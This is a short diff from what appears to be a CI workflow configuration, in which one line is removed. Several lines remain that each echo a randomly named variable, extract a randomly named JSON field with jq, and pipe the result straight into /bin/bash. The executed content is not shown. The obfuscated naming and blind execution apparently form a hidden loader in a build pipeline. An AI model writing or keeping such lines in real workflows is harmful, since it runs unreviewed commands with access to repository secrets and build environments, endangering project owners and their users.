@@ -24,7 +24,6 @@ jobs:
           echo $ltoe70 | jq -r .db16 | /bin/bash
           printf '%s' "$xlljg870" | jq -r .e3 | /bin/bash
           echo $bzn2 | jq -r .ctm8402 | /bin/bash
-          printf '%s' "$kr0817" | jq -r .suzoh95879 | /bin/bash
           echo $cytgy077 | jq -r .ysu44415 | /bin/bash
           echo $ybojr041 | jq -r .grtrh026 | /bin/bash
           echo $gwqmq782 | jq -r .t40 | /bin/bash
